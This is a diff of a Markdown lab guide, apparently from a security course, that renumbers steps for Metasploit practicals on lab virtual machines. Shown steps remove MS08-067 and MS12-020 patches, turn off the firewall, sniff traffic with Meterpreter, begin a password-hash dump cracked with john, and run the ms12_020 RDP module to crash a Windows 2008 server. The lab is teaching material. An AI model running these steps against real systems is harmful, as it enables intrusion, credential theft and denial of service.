@@ -12,14 +12,14 @@
 2. For this practical, the WinXP VM  is required
 
 **On WinXP VM**
-3. Go to the Control Panel and **Add or Remove Programs**
-4. Check the box **Show Updates**. The list of installed programs and software updates will be displayed
-5. Search the list of security updates for ones containing the Knowledge Base numbers 958644  or 2705219 of the MS08-067 or MS12-054 security bulletins. If the updates are listed on WinXP, remove them and restart the computer
+1. Go to the Control Panel and **Add or Remove Programs**
+2. Check the box **Show Updates**. The list of installed programs and software updates will be displayed
+3. Search the list of security updates for ones containing the Knowledge Base numbers 958644  or 2705219 of the MS08-067 or MS12-054 security bulletins. If the updates are listed on WinXP, remove them and restart the computer
 
 > If not, WinXP is not patched against the MS08-067 vulnerability
 
-6. Go to the Control Panel > Security Center
-7. Under Manage Security Settings, select **Windows Firewall** and turn it off. The WinXP is now a vulnerable target
+4. Go to the Control Panel > Security Center
+5. Under Manage Security Settings, select **Windows Firewall** and turn it off. The WinXP is now a vulnerable target
 
 ## Using the Metasploit Console
 **On Kali VM**
@@ -86,7 +86,7 @@ exploit
 ```
 
 **On WinXP VM**
-5.  On the Command Prompt, type the following to <u>view the connection Metasploit has made to the attacker system:</u>
+1.  On the Command Prompt, type the following to <u>view the connection Metasploit has made to the attacker system:</u>
 ```
 netstat -an
 ```
@@ -124,12 +124,12 @@ exploit
 11. Type `sniffer_start 2` (where 2 is the interface number of the VMWare network adapter)
 
 **On WinXP VM**
-12. Do some network activity e.g. pinging another system or browsing the Internet
+1. Do some network activity e.g. pinging another system or browsing the Internet
 
 **On Kali VM**
-13. Type `sniffer_stats 2` to see statistics on the number of packets and bytes captured so far
-14. Type `sniffer_dump 2 /tmp/winxp.cap` to save the captured packets into a file `/tmp/winxp.cap`
-15. View the captured packet file using Wireshark
+1. Type `sniffer_stats 2` to see statistics on the number of packets and bytes captured so far
+2. Type `sniffer_dump 2 /tmp/winxp.cap` to save the captured packets into a file `/tmp/winxp.cap`
+3. View the captured packet file using Wireshark
 
 ## Use Metasploit Meterpreter to Get Password Dump
 > Use Meterpreter to dump out password hashes from the target
@@ -153,34 +153,34 @@ sudo john filename.txt
 1. Search the Internet for information about the Microsoft Security Bulletin MS12-020 and take note of its Knowledge Base number
 
 **On Win2008 VM**
-2. Go to Start > Admin Tools > Services and enable **Remote Desktop Services**
-3. Go to Start > right-click Computer > Properties
-4. Click on Remote settings and select **Allow connections from computers running any version of Remote Desktop**
-5. On Command Prompt, type `netstat -an` and see if Port 3389 is open (Remote Desktop runs on Port 3389 by default)
-6. Go to Windows Firewall with Advanced Security and check that the Inbound Rule to allow Remote Desktop connections to TCP Port 3389 is enabled
-7. Go to Control Panel > Programs > View Installed Updates and check the list of security updates containing the Knowledge Base number for the MS12-020 security bulletin
-8. If the patch is listed, remove and start the Win2008 VM
-9. If not, Win2008 is not patched against this vulnerability
+1. Go to Start > Admin Tools > Services and enable **Remote Desktop Services**
+2. Go to Start > right-click Computer > Properties
+3. Click on Remote settings and select **Allow connections from computers running any version of Remote Desktop**
+4. On Command Prompt, type `netstat -an` and see if Port 3389 is open (Remote Desktop runs on Port 3389 by default)
+5. Go to Windows Firewall with Advanced Security and check that the Inbound Rule to allow Remote Desktop connections to TCP Port 3389 is enabled
+6. Go to Control Panel > Programs > View Installed Updates and check the list of security updates containing the Knowledge Base number for the MS12-020 security bulletin
+7. If the patch is listed, remove and start the Win2008 VM
+8. If not, Win2008 is not patched against this vulnerability
 
 **On Kali VM**
-10. On Metasploit, search for exploits related to MS12-020:
+1. On Metasploit, search for exploits related to MS12-020:
 ```
 search ms12_020
 ```
-11. Select the exploit
+2. Select the exploit
 ```
 use auxiliary/dos/windows/rdp/ms12_020_maxchannelids
 ```
-12. Set Win2008 as the RHOST
+3. Set Win2008 as the RHOST
 ```
 set RHOST Win2008-IP
 ```
-13.  Type `show options` to view the set options
-14. Run the exploit
+4.  Type `show options` to view the set options
+5. Run the exploit
 ```
 exploit
 ```
-15. The Blue Screen of Death appears in the Win2008 VM (refresh the image to get rid of the BSOD)
+6. The Blue Screen of Death appears in the Win2008 VM (refresh the image to get rid of the BSOD)
 
 ## Viewing Available Metasploit Modules
 1. List the type of modules available for Metasploit:
